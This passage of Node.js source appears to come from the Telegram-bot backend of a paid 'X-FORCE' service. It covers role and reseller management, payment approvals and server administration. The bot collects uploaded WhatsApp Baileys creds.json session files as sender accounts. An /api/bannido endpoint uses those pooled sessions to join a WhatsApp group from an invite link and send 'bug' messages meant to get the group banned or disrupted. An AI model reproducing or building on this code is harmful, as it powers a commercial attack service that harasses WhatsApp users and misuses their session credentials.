            text: "❌ Data ini bukan punyamu.",
            show_alert: true
        });
    }

    if (
        session.messageId !== query.message.message_id ||
        session.chatId !== query.message.chat.id
    ) {
        return bot.answerCallbackQuery(query.id, {
            text: "❌ Data ini bukan punyamu.",
            show_alert: true
        });
    }
}

if (data.startsWith("ckeyrole:")) {
  const [, role, username, password, duration] = data.split(":");
  const telegramRole = getTelegramRole(query.from.id);

  // ─── VALIDASI ROLE ────────────────────────────────────
  const allowedRoles = getAllowedRolesForCkey(telegramRole);
  if (!allowedRoles.includes(role)) {
    return bot.answerCallbackQuery(query.id, {
      text: `❌ Role ${role.toUpperCase()} tidak dapat kamu buat.`,
      show_alert: true
    });
  }

  // ─── CEK LIMIT ROLE (reseller/partner/owner/developer 1x) ─
  const limitCheck = checkRoleLimit(query.from.id, role, telegramRole);
  if (!limitCheck.allowed) {
    return bot.answerCallbackQuery(query.id, {
      text: `❌ ${limitCheck.reason}`,
      show_alert: true
    });
  }

  const userId = query.from.id;
  const chatId = query.message.chat.id;

  const db = loadDatabase();

  // ─── CEK USERNAME DUPLIKAT ────────────────────────────
  if (db.find(x => x.username === username)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Username sudah digunakan",
      show_alert: true
    });
  }

  // ─── BUAT AKUN ────────────────────────────────────────
  const expired = new Date();
  expired.setDate(expired.getDate() + Number(duration));
  const expiredDate = expired.toISOString().split("T")[0];

  db.push({
    username,
    password,
    role,
    createdBy: userId,
    creatorName: query.from.first_name,
    creatorRole: telegramRole,
    createdAt: new Date().toISOString(),
    expiredDate: expiredDate
  });
  saveDatabase(db);

  const successMessage =
`✅ <b>AKUN BERHASIL DIBUAT</b>

👤 Username : <code>${username}</code>
🔑 Password : <code>${password}</code>
🎭 Role : <b>${role.toUpperCase()}</b>
⏳ Durasi : ${duration} Hari
📅 Expired : <code>${expiredDate}</code>

Simpan informasi ini dengan baik.`;

  // Kirim ke Private Chat
  try {
    await bot.sendMessage(userId, successMessage, { parse_mode: "HTML" });
  } catch (e) {
    logError("Gagal kirim PV:", e.message);
  }

  // Edit pesan di grup
  await bot.editMessageText(
`✅ <b>AKUN BERHASIL DIBUAT</b>

👤 Username : <code>${username}</code>
🎭 Role : <b>${role.toUpperCase()}</b>

📩 Detail akun telah dikirim ke Private Chat.`,
    { chat_id: chatId, message_id: query.message.message_id, parse_mode: "HTML" }
  );

  return bot.answerCallbackQuery(query.id, { text: "✅ Berhasil dibuat" });
}

if (data === "ckey_cancel") {
    await bot.deleteMessage(
        query.message.chat.id,
        query.message.message_id
    );

    return bot.answerCallbackQuery(query.id,{
        text:"Dibatalkan"
    });
}

if(!data.startsWith("role:") &&
   !data.startsWith("finish:"))
return;


const session = pendingRoleMenu[userId];


if(!session){

return bot.answerCallbackQuery(query.id,{
text:"❌ Session expired atau data bukan punyamu",
show_alert:true
});

}



if(session.messageId !== query.message.message_id){

return bot.answerCallbackQuery(query.id,{
text:"❌ Tombol bukan milik kamu",
show_alert:true
});

}





// FINISH

// FINISH BUTTON

if(data.startsWith("finish:")){

    
const session = pendingRoleMenu[userId];


    delete pendingRoleMenu[userId];


    try {

        // hapus panel role
        await bot.deleteMessage(
            query.message.chat.id,
            query.message.message_id
        );


        // hapus command /addrole
        await bot.deleteMessage(
            query.message.chat.id,
            session.commandMessageId
        );


    } catch(err){

        logError(
            "Gagal hapus pesan:",
            err.message
        );

    }


    return bot.answerCallbackQuery(query.id,{
        text:"✅ Role berhasil disimpan"
    });

}

// ROLE

const [
_,
roleName,
target
]=data.split(":");


const targetId=Number(target);



if(!canGiveRole(userId,roleName)){

return bot.answerCallbackQuery(query.id,{
text:"❌ Tidak punya izin",
show_alert:true
});

}



// Di dalam callback_query untuk data.startsWith("role:")
  // ─── UPDATE DATA ───
  const cfg = loadTelegramConfig();
  const map = {
    member: "userList",
    user: "userList",
    vip: "vipUser",
    reseller: "resellerUser",
    partner: "partnerUser",
    owner: "ownerUser",
    developer: "developerUser"
  };
  const key = map[roleName];
  if (!key) return;

  if (!cfg[key]) cfg[key] = [];
  if (cfg[key].includes(targetId)) {
    cfg[key] = cfg[key].filter(x => x !== targetId);
  } else {
    cfg[key].push(targetId);
  }
  saveTelegramConfig(cfg);

  // ─── COBA EDIT PESAN (Jangan sampai error) ───
  try {
    await bot.editMessageText(
      rolePanel(session.target, session.username),
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        reply_markup: roleKeyboard(session.target, userId)
      }
    );
  } catch (e) {
    logWarning("Gagal edit pesan role: " + e.message);
  }

  // ─── SELALU JAWAB CALLBACK ───
  return bot.answerCallbackQuery(query.id, {
    text: `✅ Role ${roleName.toUpperCase()} diupdate!`
  });

} catch (err) {
    logError("===== CALLBACK QUERY ERROR =====");
    logError("Data      :", query.data);
    logError("User ID   :", query.from.id);
    logError("Error     :", err.message);
    logError(err);

    try {
        await bot.answerCallbackQuery(query.id, {
            text: "❌ Terjadi error sistem.",
            show_alert: true
        });
    } catch {}
}

});
// ===== EXISTING TELEGRAM HANDLERS =====
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'X-FORCE');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      logError(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

// ═══════════════════════════════════════════════════════════
// [+] AUTO SYNC ROLE — SAAT USER JOIN GRUP SYNC
// ═══════════════════════════════════════════════════════════
bot.on("new_chat_members", async (msg) => {
  const chatId = msg.chat.id;
  const newMembers = msg.new_chat_members || [];

  const groupRole = ROLE_SYNC_GROUPS[String(chatId)];
  if (!groupRole) return;

  for (const member of newMembers) {
    if (member.is_bot) continue;

    const memberId = member.id;
    const memberUsername = member.username || null;

    logSuccess(`[ROLE-SYNC] 👋 ${memberUsername || memberId} join grup sync (${groupRole})`);

    const result = await syncUserRoleFromGroups(memberId);

    if (result.success && result.changed) {
      await bot.sendMessage(chatId,
        `✅ *AUTO ROLE SYNC BERHASIL*\n\n` +
        `👤 ${memberUsername ? '@' + memberUsername : member.first_name}\n` +
        `🎭 Role: *${result.role.toUpperCase()}*\n\n` +
        `Role kamu otomatis di-update karena join grup ini!`,
        { parse_mode: "Markdown" }
      ).catch(() => {});
    } else if (result.reason === 'not_linked') {
      await bot.sendMessage(chatId,
        `⚠️ *AKUN BELUM TERHUBUNG*\n\n` +
        `👤 ${memberUsername ? '@' + memberUsername : member.first_name}\n\n` +
        `Kamu join grup *${groupRole.toUpperCase()}* tapi akun kamu belum di-link ke Telegram.\n\n` +
        `📌 *Cara link akun:*\n` +
        `1. Login di aplikasi X-FORCE\n` +
        `2. Buka menu Profile → Link Telegram\n` +
        `3. Atau hubungi owner untuk di-link manual\n\n` +
        `Setelah link, kirim /syncrole untuk sync manual.`,
        { parse_mode: "Markdown" }
      ).catch(() => {});
    }
  }
});

// ═══════════════════════════════════════════════════════════
// [+] AUTO DOWNGRADE — SAAT USER KELUAR GRUP SYNC
// ═══════════════════════════════════════════════════════════
bot.on("left_chat_member", async (msg) => {
  const chatId = msg.chat.id;
  const member = msg.left_chat_member;

  if (!member || member.is_bot) return;

  const groupRole = ROLE_SYNC_GROUPS[String(chatId)];
  if (!groupRole) return;

  const memberId = member.id;
  const memberUsername = member.username || null;

  logSuccess(`[ROLE-SYNC] 👋 ${memberUsername || memberId} keluar dari grup sync (${groupRole})`);

  await syncUserRoleFromGroups(memberId);
});

bot.on("my_chat_member", async (msg) => {
    try {
        const chat = msg.chat;

        // Hanya group/supergroup
        if (!["group", "supergroup"].includes(chat.type)) return;

        // Bot baru ditambahkan
        const status = msg.new_chat_member.status;
        if (!["member", "administrator"].includes(status)) return;

        // Kalau group diizinkan
        if (ALLOWED_GROUPS.includes(chat.id)) return;

        const username = msg.from.username
            ? `@${msg.from.username}`
            : "Tidak ada username";

        const groupName = chat.title || "Tanpa Nama";

        // Kirim pesan ke group
        await bot.sendMessage(chat.id, `❌ *AKSES DITOLAK*
Grup ini tidak terdaftar pada database bot.
Silakan hubungi @xyzyanzzi apabila ingin menggunakan bot ini.`, {
            parse_mode: "Markdown"
        }).catch(() => {});

        // Kirim log ke admin
        await bot.sendMessage(ALLOWED_GROUPS, `🚨 *BOT TERDETEKSI DITAMBAHKAN KE GRUP TIDAK TERDAFTAR*

👤 Pengundang : ${username}
🏷 Nama Grup : ${groupName}
🆔 ID Grup : \`${chat.id}\`

⚠️ Grup tidak ditemukan pada database ALLOWED_GROUPS.`, {
            parse_mode: "Markdown"
        }).catch(() => {});

        // Keluar
        await bot.leaveChat(chat.id).catch(() => {});

    } catch (err) {
        logError(err);
    }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.godUser.includes(id);
  const bl = getBlacklist();
  
  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'X-FORCE' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    logError(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    logError("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerUser.includes(id);
  const bl = getBlacklist();
  
  if (bl.includes(String(msg.from.id))) {
    return bot.sendMessage(
      msg.chat.id,
      "🚫 Maaf, kamu sedang diblacklist dari penggunaan bot.\nHubungi @xyzyanzzi jika merasa ini adalah kesalahan."
    );
  }

  if (!isOwner) {
    return bot.sendMessage(chatId, " [ACCESS] *PERMISSION DENIED*\n\n Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, " [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  logWarning("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});


// ==========================================================
// [+] COMMAND: /backup - Backup manual
// ==========================================================
bot.onText(/^\/backup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // 🔒 CEK AKSES — HANYA ID DIIZINKAN
  if (!isAllowedBackupTelegram(userId)) {
    return bot.sendMessage(chatId, "🚫 Akses ditolak! Hanya owner server yang bisa backup.");
  }

  await bot.sendMessage(chatId, "💾 *Memulai backup...*\n\nMohon tunggu, ini bisa memakan waktu beberapa detik.", { parse_mode: "Markdown" });

  const result = await performBackup(`Manual Backup oleh ${msg.from.first_name}`);

  if (result) {
    await sendRich(chatId,
  `📁 *Folder:* \`${result.folderName}\`\n` +
  `📄 *Total File:* ${result.fileCount}\n` +
  `💾 *Total Size:* ${result.totalSizeMB} MB\n` +
  `⏱️ *Durasi:* ${(result.durationMs / 1000).toFixed(2)}s\n` +
  `🕐 *Waktu:* ${new Date(result.createdAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
  { title: '✅ BACKUP BERHASIL' }
);
  } else {
    await bot.sendMessage(chatId, "❌ *BACKUP GAGAL!*\n\nCek log server untuk detail.", { parse_mode: "Markdown" });
  }
});

// ==========================================================
// [+] COMMAND: /listbackup - Lihat daftar backup
// ==========================================================
bot.onText(/^\/listbackup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // 🔒 CEK AKSES
  if (!isAllowedBackupTelegram(userId)) {
    return bot.sendMessage(chatId, "🚫 Akses ditolak! Hanya owner server yang bisa lihat daftar backup.");
  }

  initBackupDir();
  const folders = fs.readdirSync(BACKUP_DIR)
    .filter(f => f.startsWith('backup_') && fs.statSync(path.join(BACKUP_DIR, f)).isDirectory())
    .sort()
    .reverse();

  if (folders.length === 0) {
    return bot.sendMessage(chatId, "📭 Belum ada backup tersimpan.");
  }

  const state = readBackupState();  // ✅ deklarasi state di sini

  let lines = `📦 *Total:* ${folders.length} backup\n`;
  lines += `💽 *Max Disimpan:* ${MAX_BACKUPS}\n`;
  lines += `⏰ *Interval:* ${Math.round(BACKUP_INTERVAL_MS / 60000)} menit\n`;
  lines += `🕐 *Last Backup:* ${state.lastBackup ? new Date(state.lastBackup).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) : "N/A"}\n\n`;

  const recent = (state.history || []).slice(0, 10);
  if (recent.length === 0) {
    lines += `_Belum ada history backup._\n`;
  } else {
    recent.forEach((h, i) => {
      lines += `*${i + 1}. 📁 \`${h.folderName}\`*\n`;
      lines += `   📄 ${h.fileCount} file | 💾 ${h.totalSizeMB} MB\n`;
      lines += `   📝 ${h.reason}\n\n`;
    });
  }

  await sendRich(chatId, lines, {
    title: '💾 DAFTAR BACKUP',
    footer: '/backup — Backup manual\n/cleanupbackup — Hapus semua'
  });
});

// ==========================================================
// [+] COMMAND: /cleanupbackup - Hapus semua backup
// ==========================================================
bot.onText(/^\/cleanupbackup$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // 🔒 CEK AKSES
  if (!isAllowedBackupTelegram(userId)) {
    return bot.sendMessage(chatId, "🚫 Akses ditolak! Hanya owner server yang bisa hapus backup.");
  }

  initBackupDir();
  const folders = fs.readdirSync(BACKUP_DIR)
    .filter(f => f.startsWith('backup_') && fs.statSync(path.join(BACKUP_DIR, f)).isDirectory());

  let deleted = 0;
  for (const folder of folders) {
    try {
      fs.rmSync(path.join(BACKUP_DIR, folder), { recursive: true, force: true });
      deleted++;
    } catch (e) {
      logError(`[BACKUP] Gagal hapus ${folder}: ${e.message}`);
    }
  }

  saveBackupState({ lastBackup: 0, backupCount: 0, history: [] });

  await sendRich(chatId, `Berhasil menghapus *${deleted}* folder backup.`, {
    title: '🗑️ CLEANUP BACKUP'
  });
});
// ==========================================================
// [+] COMMAND: /status - Cek status server
// ==========================================================
bot.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);
  const bl = getBlacklist();

  if (bl.includes(String(userId))) {
    return bot.sendMessage(chatId, "🚫 Diblacklist.");
  }

  if (!["god", "developer", "owner"].includes(role)) {
    return bot.sendMessage(chatId, "❌ Akses ditolak.");
  }

  const state = readRestartState();
  const uptime = formatUptime(Date.now() - SERVER_START_TIME);
  const mem = process.memoryUsage();
  const memUsedMB = Math.round(mem.rss / 1024 / 1024);
  const memHeapMB = Math.round(mem.heapUsed / 1024 / 1024);
  const totalMemMB = Math.round(os.totalmem() / 1024 / 1024);
  const freeMemMB = Math.round(os.freemem() / 1024 / 1024);
  const cpuLoad = os.loadavg()[0].toFixed(2);

  const nextRestart = state.lastRestart
    ? RESTART_INTERVAL_MS - (Date.now() - state.lastRestart)
    : RESTART_INTERVAL_MS;

  const waCount = Object.keys(activeConnections).length;

  await sendRich(chatId,
    `*Status:* ONLINE\n` +
    `*Uptime:* ${uptime}\n\n` +
    `*🖥️ SYSTEM*\n` +
    `├ Node: ${process.version}\n` +
    `├ Platform: ${process.platform}\n` +
    `└ CPU Load: ${cpuLoad}\n\n` +
    `*💾 MEMORY*\n` +
    `├ RSS: ${memUsedMB} MB\n` +
    `├ Heap: ${memHeapMB} MB\n` +
    `├ Total RAM: ${totalMemMB} MB\n` +
    `└ Free RAM: ${freeMemMB} MB\n\n` +
    `*📱 WHATSAPP*\n` +
    `├ Active Sessions: ${waCount}\n` +
    `└ Business: ${Object.keys(biz).length}\n\n` +
    `*🔄 RESTART INFO*\n` +
    `├ Total Restart: ${state.restartCount || 0}\n` +
    `├ Last: ${state.lastRestart ? new Date(state.lastRestart).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) : "N/A"}\n` +
    `└ Next: ${nextRestart > 0 ? formatUptime(nextRestart) : "Sebentar lagi"}`,
    { title: '⚙️ SERVER STATUS' }
  );
});
// ==========================================================
// [+] COMMAND: /restartnow - Force restart sekarang
// ==========================================================
bot.onText(/^\/restartnow$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);
  const bl = getBlacklist();

  if (bl.includes(String(userId))) {
    return bot.sendMessage(chatId, "🚫 Diblacklist.");
  }

  if (role !== "god") {
    return bot.sendMessage(chatId, "❌ Hanya God yang bisa force restart.");
  }

  await sendRich(chatId,
    `Force restart dimulai...\nMohon tunggu ~10-30 detik.`,
    {
      title: '⚙️ MEMULAI RESTART',
      footer: 'Server akan restart otomatis'
    }
  );

  performRestart(`Manual Force Restart oleh ${msg.from.first_name}`);
});

// ==========================================================
// [+] COMMAND: /setinterval - Set interval auto-restart
// ==========================================================
bot.onText(/^\/setinterval\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);

  if (role !== "god") {
    return bot.sendMessage(chatId, "❌ Hanya God yang bisa ubah interval.");
  }

  const hours = parseInt(match[1]);
  if (hours < 1 || hours > 72) {
    return bot.sendMessage(chatId, "❌ Interval harus 1-72 jam.");
  }

  // Update runtime variable (perlu restart untuk persist)
  logSuccess(`[RESTART] Interval diubah ke ${hours} jam (perlu restart manual)`);
  
  await bot.sendMessage(chatId, 
    ` Interval auto-restart diubah ke *${hours} jam*.\n\n` +
    ` Perubahan akan aktif setelah restart.\n` +
    `Gunakan /restartnow untuk apply sekarang.`,
    { parse_mode: "Markdown" }
  );
});

// ==========================================================
// [+] ENDPOINT: /api/bannido - Ban Group via Link Invite
// ==========================================================
app.get("/api/bannido", async (req, res) => {
  const { key, link } = req.query;

  // ─── VALIDASI INPUT ──────────────────────────────────
  if (!key) {
    return res.status(400).json({ valid: false, message: "Parameter 'key' wajib diisi" });
  }
  if (!link) {
    return res.status(400).json({ valid: false, message: "Parameter 'link' wajib diisi. Contoh: https://chat.whatsapp.com/xxx" });
  }

  // ─── VALIDASI SESSION ────────────────────────────────
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Session key tidak valid" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.status(404).json({ valid: false, message: "User tidak ditemukan" });
  }

  // ─── CEK MAINTENANCE / BANNED ────────────────────────
  if (user.isBanned) {
    return res.status(403).json({ valid: false, message: "Akun lo lagi dibanned" });
  }

  // ─── CEK ROLE ────────────────────────────────────────
  const role = (user.role || "member").toLowerCase();
  const allowedRoles = ["owner", "developer", "partner", "reseller", "vip", "admin"];
  if (!allowedRoles.includes(role)) {
    return res.status(403).json({ valid: false, message: `Role '${role}' tidak diizinkan pakai fitur ini` });
  }

  // ─── CEK COOLDOWN ────────────────────────────────────
  const cooldowns = {
    member: 250, vip: 60, reseller: 30, admin: 30,
    partner: 10, moderator: 5, owner: 3, developer: 3
  };
  const cd = cooldowns[role] ?? 60;
  const now = Date.now();
  if (!user.lastBannido) user.lastBannido = 0;
  const diff = Math.floor((now - user.lastBannido) / 1000);

  if (diff < cd) {
    return res.status(429).json({
      valid: false,
      cooldown: true,
      wait: cd - diff,
      message: `Tunggu ${cd - diff} detik lagi`
    });
  }

  // ─── EXTRACT INVITE CODE ─────────────────────────────
  const inviteMatch = link.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
  if (!inviteMatch) {
    return res.status(400).json({
      valid: false,
      message: "Link undangan tidak valid. Contoh: https://chat.whatsapp.com/xxxxx"
    });
  }
  const inviteCode = inviteMatch[1];

  // ─── UPDATE COOLDOWN ─────────────────────────────────
  user.lastBannido = now;
  saveDatabase(db);

  // ─── RESPONSE LANGSUNG (ASYNCHRONOUS PROCESS) ────────
  res.json({
    valid: true,
    status: "processing",
    target: link,
    inviteCode,
    message: "Proses join & ban grup sedang berjalan..."
  });

  // ═══════════════════════════════════════════════════════
  // PROSES BACKGROUND
  // ═══════════════════════════════════════════════════════
  setImmediate(async () => {
    saveUserLog(user.username, "bannido", "Ban Group", `Target: ${link} | Role: ${role}`);
    logSuccess(`[BANNIDO] ${user.username} → ${link}`);

    // ─── AMBIL SOCK ────────────────────────────────────
    let sock = null;

    if (role === "vip") {
      // VIP pool + personal
      let pool = [];
      const vipPath = path.join(__dirname, "vip");
      const userPath = path.join(__dirname, "X-FORCE", user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        logError(`[BANNIDO] ❌ VIP: tidak ada sock aktif`);
        return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];

    } else if (["owner", "developer", "partner", "reseller", "admin"].includes(role)) {
      // Global: pakai sender dari manapun
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        logError(`[BANNIDO] ❌ Global: tidak ada koneksi aktif`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];

    } else {
      // Private: pakai sock milik sendiri
      sock = checkActiveSessionInFolder(user.username);
      if (!sock) {
        logError(`[BANNIDO] ❌ Private: tidak ada sender aktif untuk ${user.username}`);
        return;
      }
    }

    // ─── JOIN GROUP ────────────────────────────────────
    try {
      logSuccess(`[BANNIDO] 🔗 Join invite: ${inviteCode}`);

      let groupJid;
      try {
        groupJid = await sock.groupAcceptInvite(inviteCode);
      } catch (joinErr) {
        // Kalau sudah join, coba getInviteInfo
        if (joinErr.message.includes("already") || joinErr.message.includes("exist")) {
          const info = await sock.groupGetInviteInfo(inviteCode);
          groupJid = info.id;
          logWarning(`[BANNIDO] ⚠️ Bot sudah join, pakai JID existing: ${groupJid}`);
        } else {
          throw joinErr;
        }
      }

      if (!groupJid) {
        throw new Error("Gagal join: groupJid kosong (link expired / invalid)");
      }

      logSuccess(`[BANNIDO] ✅ Join grup: ${groupJid}`);
      await sleep(800);

      // ─── KIRIM BUG GROUP ─────────────────────────────
      const totalBug = 2;
      let success = 0;
      let failed = 0;

      for (let i = 2; i < totalBug; i++) {
        try {
          await sleep(1000);
          await groupBan(sock, groupJid);
          success++;
          logSuccess(`[BANNIDO] 📱 Bug ${i + 1}/${totalBug} → ${groupJid}`);
        } catch (err) {
          failed++;
          logError(`[BANNIDO] ⚠️ Gagal kirim bug ${i + 1}: ${err.message}`);
        }
        await sleep(1000);
      }

      logSuccess(`[BANNIDO] ✅ Selesai → ${groupJid} | Success: ${success} | Failed: ${failed}`);

      // ─── KIRIM NOTIF TELEGRAM (opsional) ────────────
      bot.sendMessage(ID_GROUP,
        `📥 *BANNIDO REQUEST*\n\n` +
        `👤 ${user.username} (${role})\n` +
        `🎯 \`${groupJid}\`\n` +
        `✅ Success: ${success} | ❌ Failed: ${failed}`,
        { parse_mode: "Markdown" }
      ).catch(() => {});

    } catch (err) {
      logError(`[BANNIDO] ❌ Gagal: ${err.message}`);

      // Notif gagal
      bot.sendMessage(ID_GROUP,
        `❌ *BANNIDO FAILED*\n\n` +
        `👤 ${user.username} (${role})\n` +
        `🎯 \`${link}\`\n` +
        `📛 Error: \`${err.message.substring(0, 150)}\``,
        { parse_mode: "Markdown" }
      ).catch(() => {});
    }
  });
});

// ==========================================================
// [+] COMMAND TELEGRAM: /setoran
// ==========================================================
bot.onText(/^\/setoran(?:\s+(\w+))?(?:\s+(\w+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const role = getTelegramRole(userId);
  const bl = getBlacklist();

  if (bl.includes(String(userId))) return bot.sendMessage(chatId, "🚫 Diblacklist.");
  if (chatId !== ID_GROUP) return bot.sendMessage(chatId, "❌ Hanya di grup utama.");
  if (!["god", "developer", "owner", "admin"].includes(role)) return bot.sendMessage(chatId, "❌ Hanya admin/owner.");

  const action = (match[1] || "").toLowerCase();
  const trxId = match[2];

  if (action === "list" || action === "") {
  const list = loadSetoran().filter(s => s.status === "pending");
  if (!list.length) {
    return bot.sendMessage(chatId, "📭 Tidak ada pending.");
  }

  let lines = '';
  list.slice(0, 20).forEach((s, i) => {
    lines += `*${i + 1}. 👤 \`${s.creatorUsername}\`*\n`;
    lines += `   🆕 \`${s.newUsername}\` (${s.newUserRole})\n`;
    lines += `   💰 Rp${Number(s.jumlahTransfer).toLocaleString('id-ID')}\n`;
    lines += `   🆔 \`${s.requestId}\`\n\n`;
  });

  return sendRich(chatId, lines, {
    title: `📋 PENDING SETORAN (${list.length})`,
    footer: '/setoran acc <ID> | /setoran reject <ID>'
  });
}

  if (action === "acc" || action === "reject") {
    if (!trxId) return bot.sendMessage(chatId, `Format: /setoran ${action} <ID>`);
    const list = loadSetoran();
    const idx = list.findIndex(s => s.requestId === trxId);
    if (idx === -1) return bot.sendMessage(chatId, "❌ Tidak ditemukan.");
    const s = list[idx];
    if (s.status !== "pending") return bot.sendMessage(chatId, `⚠️ Sudah ${s.status}.`);

    if (action === "reject") {
      s.status = "rejected";
      s.processedAt = new Date().toISOString();
      s.processedBy = `TG:${userId}`;
      saveSetoran(list);
      return bot.sendMessage(chatId, `❌ \`${trxId}\` DITOLAK.`, { parse_mode: "Markdown" });
    }

    const db = loadDatabase();
    if (db.find(u => u.username === s.newUsername)) {
      s.status = "rejected"; s.reason = "Username sudah dipakai";
      saveSetoran(list);
      return bot.sendMessage(chatId, `❌ Username sudah ada. Ditolak.`);
    }

    const expired = new Date();
    expired.setDate(expired.getDate() + (s.durasiHari || 30));
    const newAcc = {
      username: s.newUsername, password: s.newPassword,
      role: (s.newUserRole || "member").toLowerCase(),
      expiredDate: expired.toISOString().split("T")[0],
      createdBy: s.creatorUsername,
      createdAt: new Date().toISOString(),
    };
    db.push(newAcc);
    saveDatabase(db);

    s.status = "approved";
    s.processedAt = new Date().toISOString();
    s.processedBy = `TG:${userId}`;
    saveSetoran(list);

    return sendRich(chatId,
  `🆔 \`${trxId}\`\n` +
  `👤 \`${newAcc.username}\`\n` +
  `🎭 ${newAcc.role.toUpperCase()}\n` +
  `⏳ ${newAcc.expiredDate}`,
  { title: '✅ SETORAN DISETUJUI' }
);
  }

  if (action === "stats") {
    const list = loadSetoran();
    const approved = list.filter(s => s.status === "approved");
    const total = approved.reduce((a, s) => a + Number(s.jumlahTransfer || 0), 0);
    return sendRich(chatId,
  `📥 Total Request: *${list.length}*\n` +
  `⏳ Pending: *${list.filter(s=>s.status==="pending").length}*\n` +
  `✅ Approved: *${approved.length}*\n` +
  `❌ Rejected: *${list.filter(s=>s.status==="rejected").length}*\n\n` +
  `💰 *Total Revenue: Rp${total.toLocaleString('id-ID')}*`,
  { title: '📊 STATISTIK SETORAN' }
);
  }

  return bot.sendMessage(chatId, `📖 *PANDUAN*\n\n/setoran list\n/setoran acc <ID>\n/setoran reject <ID>\n/setoran stats`, { parse_mode: "Markdown" });
});

// ==========================================================
// [END COMMAND SETORAN]
// ==========================================================

// ═══════════════════════════════════════════════════════════
// [+] COMMAND /syncrole — Sync Role Manual
// ═══════════════════════════════════════════════════════════
bot.onText(/^\/syncrole$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const bl = getBlacklist();

  if (bl.includes(String(userId))) {
    return bot.sendMessage(chatId, "🚫 Kamu sedang diblacklist.");
  }

  if (chatId !== ID_GROUP) {
    return bot.sendMessage(chatId, "❌ Command ini hanya bisa di grup utama.");
  }

  const username = getUsernameByTelegramId(userId);
  if (!username) {
    return bot.sendMessage(chatId,
      `⚠️ *AKUN BELUM TERHUBUNG*\n\n` +
      `Telegram ID kamu (\`${userId}\`) belum di-link ke akun X-FORCE.\n\n` +
      `📌 *Cara link:*\n` +
      `1. Login di aplikasi\n` +
